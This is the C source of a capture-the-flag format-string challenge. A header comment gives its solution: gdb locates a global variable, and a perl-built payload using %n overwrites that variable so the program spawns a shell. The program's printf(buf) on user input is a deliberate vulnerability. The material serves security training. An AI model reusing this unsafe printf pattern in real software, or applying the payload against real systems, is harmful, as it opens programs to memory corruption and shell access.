/*** 
** Solution
** user4320@shell:/problems/format_1_d407f39cdf584627$ gdb format1
** (gdb) print &x
** $1 = (<data variable, no debug info> *) 0x804a02c
** user4320@shell:/problems/format_1_d407f39cdf584627$ perl -e 'print "\x2c\xa0\x04\x08%11\$n"' > ~/format1
** user4320@shell:/problems/format_1_d407f39cdf584627$ cat ~/format1 /dev/stdin | ./format1
*/

#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int x = 3;

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, const char **argv) {
    be_nice_to_people();
    char buf[80];
    bzero(buf, sizeof(buf));
    int k = read(STDIN_FILENO, buf, 80);
    printf(buf);
    printf("%d!\n", x); 
    if (x == 4) {
        printf("running sh...\n");
        system("/bin/sh");
    }
    return 0;
}
